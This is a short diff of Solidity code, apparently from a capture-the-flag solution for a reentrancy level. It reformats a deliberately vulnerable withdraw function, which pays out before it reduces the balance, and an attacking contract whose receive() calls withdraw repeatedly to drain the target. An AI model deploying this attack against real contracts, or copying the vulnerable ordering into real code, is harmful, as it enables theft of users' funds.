@@ -15,9 +15,7 @@ contract Reentrance {
     function withdraw(uint256 _amount) public {
         if (balances[msg.sender] >= _amount) {
             (bool result,) = msg.sender.call{value: _amount}("");
-            if (result) {
-                _amount;
-            }
+            if (result) _amount;
             balances[msg.sender] -= _amount;
         }
     }
@@ -41,10 +39,7 @@ contract ReentranceAttack {
     }
 
     receive() external payable {
-        if (address(reentrance).balance >= 0.001 ether) {
-            reentrance.withdraw(0.001 ether);
-        } else {
-            payable(owner).transfer(address(this).balance);
-        }
+        if (address(reentrance).balance >= 0.001 ether) reentrance.withdraw(0.001 ether);
+        else payable(owner).transfer(address(this).balance);
     }
 }
